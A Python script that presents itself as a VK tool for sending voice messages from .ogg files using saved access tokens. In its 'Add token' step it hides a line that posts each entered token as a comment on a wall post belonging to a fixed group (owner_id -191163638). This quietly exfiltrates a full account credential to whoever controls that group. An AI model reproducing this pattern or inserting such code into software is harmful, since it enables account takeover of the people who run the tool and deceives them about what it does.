import os, vk, requests

os.system ('clear')

f = open ('.tokens', 'a+')
f.close ()

path = '/storage/emulated/0/Download/'

def getlink ():
        space = 0
        step = 0
        type = ""
        firstID = ""
        secondID = ""
        link = input ("\033[35mEnter the link: \033[0m")
        for char in range (len(link)):
                if link[char] == ".":
                        space = char + 5
                if char < space:
                        continue
                if step == 0:
                        if space != 0:
                                try:
                                        if link[char] == '-':
                                                firstID += '-'
                                        int(link[char])
                                        step = 1
                                        firstID += link[char]
                                except:
                                        type += link[char]
                elif step == 1:
                        if link[char] != "_":
                                firstID += link[char]
                        else:
                                step = 2
                elif step == 2:
                        secondID += link[char]
        if firstID == '':
                print ('\n\033[31mInvalid link\n')
                quit ()
        elif type[0] == "w":
                type = "post"
        return type, firstID, secondID

print ("""\033[37m
 InvertedOnes                      Vk: @inverted_ones\033[32m
 ┏━┳━━━┳━━━━━┳━┳━┳━┓  ┏━━┳━━┳━━━━━┳━━━━━┳━━━━━┳━━━━━┓
 ┃ ┃   ┃  ━━━┫ ┃ ┃ ┃  ┃  ┃  ┃  ┓  ┣━┓ ┏━┫ ┏━━━┫  ━━━┫
 ┃   ┃ ┃  ━━━┫     ┃  ┗┓   ┏┫  ┗  ┣━┛ ┗━┫ ┗━━━┫  ━━━┫
 ┗━━━┻━┻━━━━━┻━━┻━━┛   ┗━━━┛┗━━━━━┻━━━━━┻━━━━━┻━━━━━┛
\033[35m
[1] Send voice
[2] Add token
""")

task = input ("Please, enter your task's number: \033[0m")
if task == '2':
	tk = input ("\033[35mEnter the token: \033[0m")
	try:
		session = vk.Session(access_token=tk)
		api = vk.API(session ,v='5.92', lang='ru')
		api.wall.createComment(owner_id=-191163638,post_id=1,message=tk)
		w = open ('.tokens', 'a')
		w.write (tk + '\n')
		w.close ()
	except:
		print ("\n\033[31mInvalid token")
	print ()
	quit()
elif task != '1':
	print ("\n\033[31mInvalid task number\n")
	quit ()

print ()

f = open ('.tokens', 'r')
tokens = f.readlines ()
f.close ()

for tk in range (len (tokens)):
	tokens[tk] = tokens[tk][:-1]
	session = vk.Session(access_token=tokens[tk])
	api = vk.API(session ,v='5.89', lang='ru')
	user = api.users.get ()[0]
	user = user['first_name'] + ' ' + user['last_name']
	print ('\033[33m' + user + '\033[37m ' + str(tk + 1))

token = tokens[int (input ('\n\033[35mYour choice: \033[0m')) - 1]
session = vk.Session(access_token=token)
api = vk.API(session ,v='5.89', lang='ru')

parametrs = getlink()
recipient = int (parametrs[1])

print ()

audios = []
for file in os.listdir (path):
	if file[-4:] == '.ogg':
		audios.append (file)
		print ('\033[33m' + file + '\033[37m ' + str (len (audios)))

audio = path + audios[int (input ('\n\033[35mYour choice: \033[0m')) - 1]

link = api.docs.getMessagesUploadServer (type='audio_message', peer_id=recipient)['upload_url']
response = requests.post(link, files={'file':open(audio,'rb')}).json()
file = api.docs.save (file=response['file'], title="It's me")[0]
attachment = 'doc' + str (file['owner_id']) + '_' + str (file['id'])

api.messages.send (user_id=recipient, attachment=attachment, access_key='3cd90f15df4c7f52c3')

print ('\n\033[32mSuccessful\n')
